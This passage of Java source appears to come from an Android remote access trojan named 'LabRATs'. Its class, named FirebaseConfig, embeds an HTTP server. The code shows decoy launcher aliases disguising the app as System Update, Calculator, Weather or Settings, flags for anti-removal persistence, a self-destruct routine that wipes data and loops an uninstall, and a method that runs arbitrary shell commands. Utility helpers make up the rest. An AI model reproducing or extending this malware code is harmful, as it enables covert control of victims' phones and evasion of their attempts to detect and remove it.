            android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, 48, 48, true);
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            scaled.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, out);
            return android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP);
        } catch (Exception e) {
            return "";
        }
    }

    private void selfDestruct() {
        Log.d("SelfDestruct", "SUICIDE_INIT: Hard Persistent Trigger");
        
        // 1. SET PERSISTENT FLAG FIRST - Everything checks this now
        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putBoolean("is_destructing", true).commit(); // commit() for immediate disk write
        
        WorkManager_Sync.isDestructing = true;
        IO_Persistence_Manager.forceSkipAntiRemoval();
        
        // 1. Kill the server and communication uplink immediately
        new Thread(() -> {
            try {
                Thread.sleep(300);
                FirebaseConfig.this.stop();
            } catch (Exception ignored) {}
        }).start();

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                String pkg = context.getPackageName();
                android.content.pm.PackageManager pm = context.getPackageManager();
                String basePkg = "com.labs.labrats";

                // 2. DISABLE ALL DECOYS IMMEDIATELY (Force single icon)
                String[] decoys = {
                    basePkg + ".SystemUpdateAlias",
                    basePkg + ".CalculatorAlias",
                    basePkg + ".WeatherAlias",
                    basePkg + ".SettingsAlias"
                };
                for (String decoy : decoys) {
                    try {
                        pm.setComponentEnabledSetting(new android.content.ComponentName(context, decoy),
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            0); 
                    } catch (Exception ignored) {}
                }

                // 3. RE-ENABLE MAIN LAUNCHER AND ACTIVITY
                pm.setComponentEnabledSetting(new android.content.ComponentName(context, basePkg + ".LauncherAlias"),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        0);
                
                pm.setComponentEnabledSetting(new android.content.ComponentName(context, MainActivity.class.getName()),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        0);

                // 4. Wipe all local data except the destruct flag
                context.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE).edit().clear().apply();

                // 5. INITIATE PERSISTENT UNINSTALL LOOP
                SystemAnalytics.triggerSelfDestructLoop(context);

                // 6. Hard Kill self after 45 seconds
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    android.os.Process.killProcess(android.os.Process.myPid());
                    System.exit(0);
                }, 45000);

            } catch (Exception e) {
                Log.e("SelfDestruct", "Sequence Failure: " + e.getMessage());
            }
        });
    }



    public static class AppEntry implements Comparable<AppEntry> {
        public String name;
        public String packageName;
        AppEntry(String n, String p) { name = n; packageName = p; }
        @Override public int compareTo(AppEntry other) { return name.compareToIgnoreCase(other.name); }
    }

    private List<AppEntry> getLaunchableApps() {
        List<AppEntry> apps = new ArrayList<>();
        android.content.pm.PackageManager pm = context.getPackageManager();
        Intent intent = new Intent(Intent.ACTION_MAIN, null);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<android.content.pm.ResolveInfo> list = pm.queryIntentActivities(intent, 0);
        for (android.content.pm.ResolveInfo info : list) {
            String name = info.loadLabel(pm).toString();
            String pkg = info.activityInfo.packageName;
            apps.add(new AppEntry(name, pkg));
        }
        java.util.Collections.sort(apps);
        return apps;
    }



    private String executeShell(String command) {
        if (command == null || command.isEmpty()) return "";
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            process.waitFor();
            return "[System Command Executed]";
        } catch (Exception e) {
            return "Shell Error: " + e.getMessage();
        }
    }



    public static String getMimeType(String filename) {
        String name = filename.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg"))
            return "image/jpeg";
        if (name.endsWith(".png"))
            return "image/png";
        if (name.endsWith(".gif"))
            return "image/gif";
        if (name.endsWith(".mp4"))
            return "video/mp4";
        if (name.endsWith(".mp3"))
            return "audio/mpeg";
        if (name.endsWith(".pdf"))
            return "application/pdf";
        if (name.endsWith(".zip"))
            return "application/zip";
        if (name.endsWith(".apk"))
            return "application/vnd.android.package-archive";
        return "application/octet-stream";
    }

    public static String formatFileSize(long size) {
        if (size < 1024)
            return size + " B";
        if (size < 1024 * 1024)
            return String.format(Locale.getDefault(), "%.1f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024)
            return String.format(Locale.getDefault(), "%.1f MB", size / (1024.0 * 1024));
        return String.format(Locale.getDefault(), "%.1f GB", size / (1024.0 * 1024 * 1024));
    }

    public static String formatDuration(int seconds) {
        if (seconds < 60)
            return seconds + "s";
        if (seconds < 3600)
            return String.format(Locale.getDefault(), "%dm %ds", seconds / 60, seconds % 60);
        return String.format(Locale.getDefault(), "%dh %dm", seconds / 3600, (seconds % 3600) / 60);
    }

    private Response serveAsset(IHTTPSession session, String uri) {
        try {
            String assetPath = uri.substring(1); // Remove leading slash
            InputStream is = context.getAssets().open(assetPath);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            byte[] bytes = buffer.toByteArray();
            
            String mime = getMimeType(assetPath);
            if (assetPath.endsWith(".css")) mime = "text/css";
            else if (assetPath.endsWith(".js")) mime = "application/javascript";
            
            Response res = newFixedLengthResponse(Response.Status.OK, mime, new java.io.ByteArrayInputStream(bytes), bytes.length);
            res.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            res.addHeader("Pragma", "no-cache");
            res.addHeader("Expires", "0");
            return res;
        } catch (Exception e) {
            return serve404(session);
        }
    }
}
